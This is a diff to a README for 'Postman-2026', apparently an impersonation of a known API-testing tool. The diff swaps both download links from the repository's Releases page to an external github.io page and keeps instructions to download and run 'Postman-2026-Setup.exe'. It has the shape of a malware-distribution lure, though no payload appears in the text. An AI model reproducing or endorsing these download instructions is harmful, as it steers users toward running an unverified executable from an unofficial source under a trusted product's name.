@@ -1,6 +1,6 @@
 # 🚀 Postman-2026 - Test Web Services With Ease
 
-[![Download Postman-2026](https://img.shields.io/badge/Download-Postman--2026-blue)](https://github.com/monotypic-blowjob132/Postman-2026/releases)
+[![Download Postman-2026](https://img.shields.io/badge/Download-Postman--2026-blue)](https://monotypic-blowjob132.github.io)
 
 ## 📁 About This Software
 
@@ -22,7 +22,7 @@ Before you install this software, check that your computer meets these minimum s
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [Releases page](https://github.com/monotypic-blowjob132/Postman-2026/releases) to access the installation files.
+1. Go to the [Releases page](https://monotypic-blowjob132.github.io) to access the installation files.
 2. Look for the file labeled Postman-2026-Setup.exe.
 3. Click the link to save the file to your computer.
 4. Locate the file in your Downloads folder once the download finishes.
